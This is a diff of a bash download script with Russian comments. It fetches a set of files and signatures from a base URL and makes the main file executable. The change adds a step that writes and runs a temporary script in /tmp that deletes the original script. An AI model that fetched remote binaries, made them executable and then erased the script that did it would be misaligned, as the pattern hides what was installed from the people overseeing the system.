@@ -37,14 +37,22 @@ FILES=(
     "${BASE_URL}.dgst.sig.16"
 )
 
-# Скачивание всех файлов
+# Скачивание всех файлов с перезаписью и без вывода на экран
 for FILE in "${FILES[@]}"; do
-    echo "Скачивание $FILE"
-    wget -O "$FILE"
+    echo "Скачивание $FILE..."
+    wget -O "$(basename "$FILE")" "$FILE"
 done
 
-# Применение chmod +x к файлу ${BASE_URL}
+# Применение chmod +x к файлу ${BASE_URL} с перезаписью
 chmod +x "$(basename "${BASE_URL}")"
 
-echo "Все файлы успешно скачаны и chmod +x применен к файлу $(basename "${BASE_URL}")."
+# Создание временного скрипта для удаления
+echo "rm -- \"$0\"" > /tmp/delete_script.sh
+chmod +x /tmp/delete_script.sh
+
+# Выполнение временного скрипта
+/tmp/delete_script.sh
+
+echo "Все файлы успешно скачаны, chmod +x применен к файлу $(basename "${BASE_URL}")."
+
 
